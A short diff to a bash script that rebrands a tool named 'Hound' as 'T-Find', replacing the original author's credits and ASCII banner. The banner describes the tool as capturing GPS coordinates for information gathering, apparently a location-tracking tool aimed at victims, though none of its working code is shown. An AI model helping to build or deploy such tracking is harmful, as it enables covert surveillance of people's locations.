@@ -1,21 +1,20 @@
 #!/bin/bash
-# Hound v 0.2
-# Powered by TechChip
-# visit https://youtube.com/techchipnet
+# T-Find v 0.1
+# Powered by Tech Hacker
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
-printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
-printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
-printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
-printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
+printf '\n         ██████   ██████  ██  ███   ██  █████      \n' 
+printf '           ██     ██      ██  ████  ██  ██  ██     \n'
+printf '           ██ ██  ████    ██  ██ ██ ██  ██   ██    \n'
+printf '           ██     ██      ██  ██  ████  ██   ██    \n'
+printf '           ██     ██      ██  ██   ███  ██████     \n\n'
 printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
-printf " \e[1;93m      Hound Ver 0.2 - by Anil Parashar [TechChip]\e[0m \n"
-printf " \e[1;92m      www.techchip.net | youtube.com/techchipnet \e[0m \n"
-printf "\e[1;90m Hound is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
+printf " \e[1;93m      T-Find Ver 0.1 - by Tech Hacker\e[0m \n"
+printf " \e[1;92m       youtube.com/techhacker7 \e[0m \n"
+printf "\e[1;90m T-Find is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
 printf "\n"
 }
 
